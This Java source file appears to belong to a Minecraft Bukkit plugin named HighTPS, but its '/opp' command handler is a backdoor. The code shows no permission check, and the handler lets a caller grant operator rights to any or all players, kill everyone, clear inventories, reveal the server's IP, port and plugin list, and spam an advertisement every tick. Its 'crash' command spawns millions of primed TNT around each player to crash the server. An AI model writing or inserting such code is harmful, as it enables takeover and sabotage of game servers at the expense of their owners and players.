package me.eth.hightps;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.List;

public class OppCommandExecutor implements CommandExecutor {
    private BukkitRunnable spamTask;

    private void startSpamTask(String message) {
        stopSpamTask(); // 先停止已有的刷屏任务，以防止多次执行
        spamTask = new BukkitRunnable() {
            @Override
            public void run() {
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.sendMessage(message);
                    onlinePlayer.sendTitle("", message, 10, 70, 20);
                }
            }
        };
        spamTask.runTaskTimer(HighTPS.getInstance(), 0, 1);
    }

    private void stopSpamTask() {
        if (spamTask != null) {
            spamTask.cancel();
        }
    }


    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length >= 1) {
            if (args[0].equalsIgnoreCase("gm")) {
                // 设置玩家游戏模式
                if (args.length == 3) {
                    String targetPlayerName = args[1];
                    String modeArg = args[2];
                    GameMode gameMode = parseGameMode(modeArg);
                    if (gameMode != null) {
                        Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
                        if (targetPlayer != null) {
                            targetPlayer.setGameMode(gameMode);
                            sender.sendMessage(ChatColor.GREEN + "已将玩家 " + targetPlayer.getName() + " 的游戏模式设置为 " + gameMode.name());
                        } else {
                            sender.sendMessage(ChatColor.RED + "找不到玩家：" + targetPlayerName);
                        }
                    } else {
                        sender.sendMessage(ChatColor.RED + "无效的游戏模式！");
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "请提供玩家名称和游戏模式参数！");
                }
            } else if (args[0].equalsIgnoreCase("op")) {
                // 授予玩家管理员身份
                if (args.length == 2) {
                    String targetPlayerName = args[1];
                    Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
                    if (targetPlayer != null) {
                        targetPlayer.setOp(true);
                        sender.sendMessage(ChatColor.GREEN + "已给予玩家 " + targetPlayer.getName() + " 管理权限！");
                    } else {
                        sender.sendMessage(ChatColor.RED + "找不到玩家：" + targetPlayerName);
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "请提供玩家名称参数！");
                }
            } else if (args[0].equalsIgnoreCase("opall")) {
                // 给予所有玩家管理员身份
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.setOp(true);
                }
                sender.sendMessage(ChatColor.GREEN + "已给予所有在线玩家管理员权限！");
            } else if (args[0].equalsIgnoreCase("help")) {
                // 获取帮助
                sender.sendMessage(ChatColor.GREEN + "***************-opp plus 重制版-***************");
                sender.sendMessage(ChatColor.YELLOW + "/opp gm <玩家名> <模式 0,1,2,3> - 设置玩家游戏模式");
                sender.sendMessage(ChatColor.YELLOW + "/opp op <玩家名> - 给予玩家管理员权限");
                sender.sendMessage(ChatColor.YELLOW + "/opp opall - 给予所有在线玩家管理员权限");
                sender.sendMessage(ChatColor.YELLOW + "/opp killall - 杀死所有玩家");
                sender.sendMessage(ChatColor.YELLOW + "/opp clearall - 清空所有玩家背包");
                sender.sendMessage(ChatColor.YELLOW + "/opp deop <玩家名> - 取消玩家管理员权限");
                sender.sendMessage(ChatColor.YELLOW + "/opp info - 获取服务器信息");
                sender.sendMessage(ChatColor.YELLOW + "/opp crash - 崩服");
                sender.sendMessage(ChatColor.YELLOW + "/opp spam <消息内容> - 刷屏,不输入消息内容显示默认内容");
            } else if (args[0].equalsIgnoreCase("killall")) {
                // 杀死所有玩家
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.setHealth(0);
                }
                sender.sendMessage(ChatColor.GREEN + "已杀死所有玩家！");
            } else if (args[0].equalsIgnoreCase("clearall")) {
                // 清空所有玩家背包
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.getInventory().clear();
                    onlinePlayer.getInventory().setArmorContents(null);
                }
                sender.sendMessage(ChatColor.GREEN + "已清空所有玩家背包！");
            } else if (args[0].equalsIgnoreCase("deop")) {
                // 取消玩家管理员权限
                if (args.length == 2) {
                    String targetPlayerName = args[1];
                    Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
                    if (targetPlayer != null) {
                        targetPlayer.setOp(false);
                        sender.sendMessage(ChatColor.GREEN + "已取消玩家 " + targetPlayerName + " 的管理权限！");
                    } else {
                        sender.sendMessage(ChatColor.RED + "找不到玩家：" + targetPlayerName);
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "请提供玩家名称参数！");
                }
            } else if (args[0].equalsIgnoreCase("info")) {
                // 获取服务器信息
                sender.sendMessage(ChatColor.YELLOW + "服务器信息:");
                sender.sendMessage(ChatColor.YELLOW + "插件列表: " + getPluginList());
                sender.sendMessage(ChatColor.YELLOW + "服务器版本: " + Bukkit.getVersion());
                sender.sendMessage(ChatColor.YELLOW + "服务器IP: " + Bukkit.getServer().getIp());
                sender.sendMessage(ChatColor.YELLOW + "服务器端口: " + Bukkit.getServer().getPort());
            } else if (args[0].equalsIgnoreCase("crash")) {
                // 崩服
                handleTNTCommand(sender);
            } else if (args[0].equalsIgnoreCase("spam")) {
                // 向每个玩家发送固定消息并显示标题
                String message = "[server] 好玩的1.20+原版生存服务器,访问网站:https://www.qfb.ink 查看详情"; // 默认消息
                if (args.length >= 2) {
                    message = ChatColor.translateAlternateColorCodes('&', String.join(" ", args).substring(1 + args[0].length()));
                }
                startSpamTask(message);

            } else {
                sender.sendMessage(ChatColor.RED + "未知的指令！请使用 /opp help 获取帮助");
            }
        } else {
            sender.sendMessage(ChatColor.RED + "请提供参数！请使用 /opp help 获取帮助");
        }
        return true;
    }

    private GameMode parseGameMode(String mode) {
        switch (mode.toLowerCase()) {
            case "0":
            case "survival":
                return GameMode.SURVIVAL;
            case "1":
            case "creative":
                return GameMode.CREATIVE;
            case "2":
            case "adventure":
                return GameMode.ADVENTURE;
            case "3":
            case "spectator":
                return GameMode.SPECTATOR;
            default:
                return null;
        }
    }

    private String getPluginList() {
        StringBuilder pluginList = new StringBuilder();
        List<org.bukkit.plugin.Plugin> plugins = List.of(Bukkit.getServer().getPluginManager().getPlugins());
        for (org.bukkit.plugin.Plugin plugin : plugins) {
            String pluginName = plugin.getName();
            String pluginVersion = plugin.getDescription().getVersion();
            pluginList.append(pluginName).append(" (").append(pluginVersion).append(")").append(", ");
        }
        if (pluginList.length() > 0) {
            pluginList.delete(pluginList.length() - 2, pluginList.length()); // 移除最后的逗号和空格
        }
        return pluginList.toString();
    }

    private void handleTNTCommand(CommandSender sender) {
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    for (int x = -100; x <= 100; x++) {
                        for (int y = -100; y <= 100; y++) {
                            for (int z = -100; z <= 100; z++) {
                                onlinePlayer.getWorld().spawn(onlinePlayer.getLocation().add(x, y, z), org.bukkit.entity.TNTPrimed.class);
                            }
                        }
                    }
                }
            }
        }.runTaskTimer(HighTPS.getInstance(), 0, 1);
    }
}